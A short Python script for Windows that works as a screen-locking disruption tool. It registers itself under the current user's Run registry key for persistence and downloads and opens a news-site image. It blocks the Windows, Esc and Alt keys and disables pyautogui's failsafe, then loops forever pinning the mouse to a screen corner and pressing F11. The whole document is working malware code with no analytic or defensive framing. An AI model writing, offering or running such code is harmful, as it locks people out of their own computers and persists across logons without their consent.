import requests
import os
import tkinter as tk
import winreg as reg
import time
import pyautogui
import keyboard
pyautogui.FAILSAFE = False

root = tk.Tk()
url = 'https://www.volynnews.com/resize/640x555/r/files/news/2022/02-27/332763/IMG_6709.JPG'

pth = os.path.dirname(os.path.realpath(__file__))
 
s_name = "palanica" 
 
address = os.path.join(pth, s_name)
 
tmp = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
 
reg.SetValue(tmp, None, reg.REG_SZ, address)
 
reg.CloseKey(tmp)

img = requests.get(url)
imgOption = open('palanica.jpg', 'wb')
imgOption.write(img.content)
imgOption.close()

keyboard.block_key('windows')
keyboard.block_key('esc')
keyboard.block_key('alt')
os.system('palanica.jpg')
time.sleep(0.3)
pyautogui.press('f11')
while True:
    pyautogui.moveTo(root.winfo_screenwidth(), root.winfo_screenheight(), 0)
    pyautogui.press('f11')